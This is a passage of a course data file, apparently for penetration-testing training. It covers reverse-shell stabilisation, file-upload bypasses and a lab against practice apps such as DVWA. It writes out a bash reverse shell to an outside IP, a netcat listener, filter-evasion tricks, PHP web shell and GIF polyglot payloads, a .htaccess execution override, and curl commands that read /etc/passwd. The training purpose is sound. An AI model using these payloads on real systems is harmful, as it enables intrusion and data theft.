        "Upgrading Dumb Reverse Shells to Fully Interactive TTY Terminals: Initial reverse shells caught via Netcat are 'dumb' shells: they lack tab-completion, history scrolling with arrow keys, job control, and terminate immediately if the attacker accidentally types Ctrl+C. Attackers stabilize the shell using Python: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. The attacker then backgrounds the session with Ctrl+Z, configures their local terminal with 'stty raw -echo; fg', and exports 'export TERM=xterm' to achieve a full TTY terminal.",
      ],
      terminalCommands: [
        "nc -lvnp 4444",
        "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      ],
      proTips: [
        "Use `${IFS}` instead of standard spaces when web application firewalls strip or block whitespace characters.",
        "When testing for blind RCE, use `sleep 10` or `ping -c 10 127.0.0.1` and verify whether the response time increases by exactly 10 seconds.",
      ],
    },
    {
      id: "l-6-6",
      lessonNumber: "6.6",
      title: "File Upload Vulnerabilities & Web Shell Execution",
      duration: "4.5 Hours",
      badge: "File Uploads",
      summary:
        "Bypassing MIME-type checks, file extension blacklists, and image re-compression using Polyglot files to execute persistent PHP, ASPX, and JSP web shells.",
      studyNotes: [
        {
          heading: "The Anatomy of Unrestricted File Upload Flaws",
          subheading: "How web applications allow malicious code execution via uploaded assets",
          points: [
            "Root Cause: Occurs when an application allows users to upload files to the server filesystem without adequately verifying the file extension, file contents, and execution permissions in the destination folder.",
            "Direct Web Shell Execution: If an attacker uploads `shell.php` to a publicly accessible directory (`/uploads/shell.php`), navigating to that URL in a browser forces the web server (Apache with mod_php) to execute the PHP code, granting instant RCE.",
            "Client-Side Validation Bypasses: Bypassing browser-enforced HTML `<input accept=\"image/*\">` or JavaScript extension checks by simply capturing the request in Burp Suite and renaming the filename to `.php`.",
            "MIME-Type & Content-Type Spoofing: If the backend checks `$_FILES['file']['type'] == 'image/jpeg'`, an attacker sends a PHP script while forging the HTTP header `Content-Type: image/jpeg` in Burp.",
          ],
          callout: "The most robust defensive design for file uploads: 1. Store uploaded files on a separate, non-executable domain or S3 bucket; 2. Randomly rename all uploaded files to UUIDs; 3. Strip all execution permissions (`chmod 644`) from the upload folder.",
          diagramOrCode: `+-------------------------------------------------------------+
|               MALICIOUS WEB SHELL UPLOAD FLOW               |
+-------------------------------------------------------------+
 Attacker uploads via Burp:
   POST /upload.php HTTP/1.1
   Content-Type: multipart/form-data; boundary=---123
   
   ---123
   Content-Disposition: form-data; name="avatar"; filename="shell.php"
   Content-Type: image/jpeg  <-- Spoofed MIME Type!
   
   <?php system($_GET['cmd']); ?>
   ---123--
        |
        v
 Server saves file to: /var/www/html/uploads/shell.php
        |
        v Attacker accesses:
 https://target.com/uploads/shell.php?cmd=cat+/etc/passwd
 Result: Operating system output rendered in browser!`
        },
        {
          heading: "Extension Blacklist Bypasses & Image Polyglots",
          subheading: "Evading file extension filters and image re-compression libraries",
          points: [
            "Alternative Executable Extensions: If `.php` is blacklisted, test alternative execution mappings: `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, or case variations (`.PhP`). For ASP.NET: `.aspx`, `.ashx`, `.asmx`. For Java: `.jsp`, `.jspx`.",
            "Null Byte & Truncation Injections: In legacy PHP (pre-5.3.4), submitting `shell.php%00.jpg` tricked the validation into seeing a `.jpg`, but the filesystem truncated the string at the null byte (`%00`), saving it as `shell.php`.",
            "Overriding Server Configurations (`.htaccess`): If you can upload an `.htaccess` file to an Apache server, you can map `.png` files to execute as PHP: `AddType application/x-httpd-php .png`. Then upload `shell.png` containing PHP code!",
            "GIF/JPEG Polyglots: Combining valid image magic bytes (`GIF89a;`) with executable PHP code. Even if the server verifies the file with `getimagesize()`, the image header is valid while the trailing payload executes when invoked.",
          ],
          callout: "GIF89a Magic Bytes Trick: Prepending `GIF89a;` to the very first line of a PHP web shell fools many naive image validation functions into classifying the file as a valid GIF image.",
          diagramOrCode: `MINIMAL PHP WEB SHELL ONE-LINER:
  <?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>

GIF POLYGLOT WEB SHELL:
  GIF89a;
  <?php system($_GET['cmd']); ?>`
        }
      ],
      keyTopics: [
        "Unrestricted File Upload Vulnerability Mechanics: File upload vulnerabilities occur when an application allows users to upload files to the server's filesystem without adequately verifying the file's extension, MIME type, and directory execution permissions. If an attacker uploads a server-side executable script (such as shell.php, exploit.aspx, or backdoor.jsp) into a publicly accessible directory, navigating to that file's URL in a browser forces the web server interpreter to execute the script, granting immediate Remote Code Execution.",
        "Bypassing Client-Side & MIME-Type Content Validation: Client-side validation using JavaScript or HTML5 accept attributes (<input accept='image/*'>) is easily bypassed by intercepting the upload request in Burp Suite and renaming the file extension back to .php. If the backend server verifies uploads by checking the 'Content-Type' header sent by the client, an attacker simply uploads their PHP web shell while spoofing the header to 'Content-Type: image/jpeg', tricking naive verification functions.",
        "Extension Blacklist Evasion & Alternative Executable Extensions: When servers enforce blacklists blocking '.php', attackers test alternative extensions that web server configurations map to the same scripting engine: .phtml, .php3, .php4, .php5, .phar, and case variations like .PhP. On Microsoft IIS servers, alternatives include .aspx, .ashx, and .asmx; on Java servers, alternatives include .jsp and .jspx. In legacy PHP installations, appending null bytes (shell.php%00.jpg) truncated the filename on disk.",
        "Web Server Configuration Overrides (.htaccess & web.config): On Apache web servers where AllowOverride is enabled, an attacker can upload a custom '.htaccess' configuration file to modify the server's execution rules. Uploading an .htaccess file containing 'AddType application/x-httpd-php .jpg' instructs Apache to treat all .jpg image files in that directory as executable PHP scripts! The attacker then uploads shell.jpg containing malicious PHP code, achieving RCE while bypassing all extension filters.",
        "Image Polyglots & GIF89a Header Injection: Advanced applications validate uploaded files by passing them through image processing libraries (such as PHP's getimagesize()) or re-compressing them. An image polyglot is a valid image file that simultaneously functions as executable code. Prepending the GIF89a magic bytes header to a PHP script ('GIF89a;<?php system($_GET[\"cmd\"]); ?>') fools image parsers into recognizing the file as a valid GIF image while ensuring the PHP interpreter executes the payload.",
      ],
      terminalCommands: [
        "echo 'GIF89a;<?php system($_GET[\"c\"]); ?>' > exploit.gif.php",
        "curl https://target.com/uploads/exploit.gif.php?c=id",
      ],
      proTips: [
        "If the web server blocks `.php`, upload a custom `.htaccess` file containing `AddType application/x-httpd-php .jpg`; all `.jpg` files in that folder will now execute as PHP!",
        "Always check SVG uploads: SVG is an XML-based image format, making it directly vulnerable to Stored XSS and XML External Entity (XXE) attacks.",
      ],
    },
  ],
  handsOnLab: {
    title: "Lab 6: Full OWASP Multi-Stage Exploitation Chain",
    target: "OWASP Top 10 Practice Target (Damn Vulnerable Web App / Juice Shop)",
    goal: "Execute a multi-stage attack chain: bypass file upload filters to drop a web shell, use the shell to discover database credentials, dump the customer table via SQLi, and extract internal metadata via SSRF.",
    steps: [
      "1. Identify an image upload endpoint and bypass extension filtering using alternative extensions (.phtml or .htaccess override).",
      "2. Execute commands through the web shell to view database connection strings in config files.",
      "3. Exploit an in-band UNION SQL injection vulnerability to dump administrative password hashes.",
      "4. Trigger an SSRF vulnerability against the cloud metadata service to capture temporary IAM tokens.",
    ],
    verification: "Submit the root flag captured from the server, the administrative password hash, and the extracted cloud role credentials.",
  },
  checklist: [
    { id: "ch6-t1", label: "Mastered UNION-based, Error-based, and Blind SQL Injection extraction mechanics" },
    { id: "ch6-t2", label: "Automated database schema extraction and OS shell acquisition using SQLmap" },
    { id: "ch6-t3", label: "Differentiated between Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)" },
    { id: "ch6-t4", label: "Weaponized XSS payloads for cookie harvesting and Anti-CSRF token theft" },
    { id: "ch6-t5", label: "Exploited Server-Side Request Forgery (SSRF) against AWS/GCP cloud metadata instances" },
    { id: "ch6-t6", label: "Circumvented SSRF filters using decimal, hex, and open redirect chaining" },
    { id: "ch6-t7", label: "Discovered and exploited Broken Object Level Authorization (IDOR/BOLA) across REST APIs" },
    { id: "ch6-t8", label: "Weaponized Command Injection, bypassed character filters, and upgraded to interactive TTY shells" },
    { id: "ch6-t9", label: "Bypassed file upload controls using MIME spoofing, alternative extensions, and polyglots" },
  ],
};
